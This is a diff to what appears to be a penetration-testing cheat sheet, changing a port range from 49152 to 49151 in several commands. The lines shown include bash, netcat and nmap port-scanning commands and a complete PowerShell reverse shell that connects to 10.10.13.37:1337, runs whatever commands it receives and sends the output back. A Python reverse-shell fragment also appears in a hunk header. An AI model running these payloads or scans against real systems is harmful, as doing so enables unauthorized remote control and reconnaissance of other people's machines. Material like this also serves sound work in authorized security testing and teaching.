@@ -2374,14 +2374,14 @@ $ nmaptocsv.py --help
 Echo:
 
 ```
-$ IP="0.0.0.0"; for p in $(seq 1 49152); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$p && echo OPEN:$p" >> hosts/ports.txt &) 2>/dev/null; done
+$ IP="0.0.0.0"; for p in $(seq 1 49151); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$p && echo OPEN:$p" >> hosts/ports.txt &) 2>/dev/null; done
 $ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
 ```
 
 Netcat:
 
 ```
-$ seq 1 49152 | xargs -n1 | xargs -P0 -I {} nc -nzv -w1 0.0.0.0 {} 2>&1 | grep -vE "timed out|now in progress|Connection refused"
+$ seq 1 49151 | xargs -n1 | xargs -P0 -I {} nc -nzv -w1 0.0.0.0 {} 2>&1 | grep -vE "timed out|now in progress|Connection refused"
 ```
 
 Nmap:
@@ -2403,7 +2403,7 @@ $ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-protocol-servic
 ### Ports (Full)
 
 ```
-$ nmap -Pn -T3 [--min-rate 50000 --min-hostgroup 256] -sV --version-intensity 6 -iL targets.txt --open -p1-49152 -oA services/alltcp-versions
+$ nmap -Pn -T3 [--min-rate 50000 --min-hostgroup 256] -sV --version-intensity 6 -iL targets.txt --open -p1-49151 -oA services/alltcp-versions
 ```
 
 Define which NSE scripts ran:
@@ -5987,7 +5987,7 @@ import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.conne
 System.Net.Sockets.TCPClient:
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..49152|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..49151|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 
